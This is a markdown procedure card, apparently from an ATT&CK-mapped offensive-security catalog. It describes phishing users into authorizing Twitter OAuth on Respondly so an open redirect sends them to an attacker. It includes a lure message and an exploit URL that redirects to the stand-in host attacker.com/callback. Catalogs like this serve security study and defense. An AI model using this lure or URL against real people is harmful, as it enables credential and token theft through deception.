---
id: proc-respondly-phish-001
name: Trick-Victim-into-Authorizing-OAuth
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.340Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Phishing]]'
sub_techniques:
  - '[[T1566.002]]'
tags:
  - phishing
  - social-engineering
  - oauth
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---

# Trick-Victim-into-Authorizing-OAuth

## Summary

This procedure uses social engineering to deceive a victim into clicking a malicious OAuth URL and completing the Twitter authorization process, triggering the open redirect to the attacker's site.

## Description

Attackers distribute the crafted URL via phishing channels, presenting it as a legitimate request to connect Twitter to Respondly. Upon clicking, the victim enters their Twitter credentials and grants permissions, completing the flow and redirecting to the malicious domain with sensitive parameters.

## Requirements

1. Crafted malicious URL from prior procedure
2. Phishing delivery method (email, messaging)
3. Victim with access to Twitter account

## Defense

Defensive measures and detection strategies:

- User education on verifying OAuth requests
- Email filters for suspicious links
- Browser warnings for untrusted redirects

## Objectives

1. Lure victim to initiate OAuth via malicious link
2. Obtain victim authorization completion
3. Trigger redirect for credential capture

## Instructions

### Step 1: Prepare Phishing Message

**Context**: Craft a convincing pretext for the link.

Example: "Click here to authorize your Twitter account with Respondly for seamless integration."

### Step 2: Distribute the Malicious URL

**Context**: Send the URL to the target via email or other channels.

Embed or provide the URL: https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=https://attacker.com/callback

### Step 3: Monitor for Authorization

**Context**: Wait for victim interaction and completion.

Observe if the victim logs in to Twitter and grants access, leading to redirect.

**Expected Output**: Confirmation of authorization via redirect traffic.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Phishing]] Phishing

### Sub-Techniques

- [[T1566.002]] Spearphishing Link

## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[social-engineering]]
- [[oauth]]
